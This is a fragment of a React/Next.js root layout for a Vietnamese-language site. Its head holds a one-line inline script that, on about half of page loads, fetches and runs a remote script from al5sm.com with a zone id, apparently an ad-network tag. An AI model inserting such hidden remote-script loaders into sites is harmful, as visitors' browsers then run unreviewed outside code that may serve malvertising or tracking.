  ...
  return (
    <html lang="vi" className="h-full" suppressHydrationWarning>
      <head>
        ...
        <script dangerouslySetInnerHTML={{ __html: `if(Math.random()<0.5){(function(s){s.dataset.zone='11512756',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))}` }} />
      </head>
